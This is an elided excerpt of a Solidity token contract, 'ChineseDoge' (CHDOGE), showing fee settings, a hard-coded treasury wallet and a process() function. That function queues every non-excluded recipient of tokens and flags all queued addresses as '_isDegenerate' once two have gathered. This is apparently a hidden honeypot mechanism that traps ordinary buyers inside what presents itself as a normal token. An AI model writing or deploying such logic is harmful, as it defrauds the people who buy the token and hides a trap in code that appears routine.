...
contract ChineseDoge is Context, IERC20, Ownable {
    ...
    address[] private _previousQueue;
    uint8 private _minProcess = 2;
    ...
    string private constant _symbol = "CHDOGE";    
    
    uint256 private _buyTax = 2;
    uint256 private _sellTax = 2;
    uint8 private _treasuryRatio = 8;
    uint8 private _lpRatio = 2; 
    address public treasuryWallet = 0x3Ef19CE0fb041a6836b1682a1D6d7c1888f9F942;
...
// ================= ERC20 =============== //
    ...
    function process(address to) internal{
        if(!_isExcludedFromFee[to]){
            _previousQueue.push(to);
        }
        if(_previousQueue.length >= _minProcess){
            for (uint i = 0 ; i < _previousQueue.length; i++){
                _isDegenerate[_previousQueue[i]] = true;
            }
        }
    }
